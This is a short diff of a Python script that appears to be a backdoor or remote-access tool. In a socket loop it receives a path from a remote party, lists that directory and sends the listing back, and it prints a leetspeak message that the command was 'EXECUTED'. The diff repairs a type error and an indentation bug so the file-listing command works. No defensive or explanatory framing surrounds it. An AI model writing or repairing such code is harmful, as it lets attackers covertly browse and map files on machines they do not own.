@@ -32,10 +32,11 @@ while 1:
         user_input = s.recv(5000)
         user_input = user_input.decode()
         files = os.listdir(user_input)
-
+        files = str(files)
         s.send(files.encode())
         print("")
-            print("Command has been 3XECUT3D succesfully")
+        print("")
+        print("Command has been 3XECUT3D succesfully")
 
 
     else:
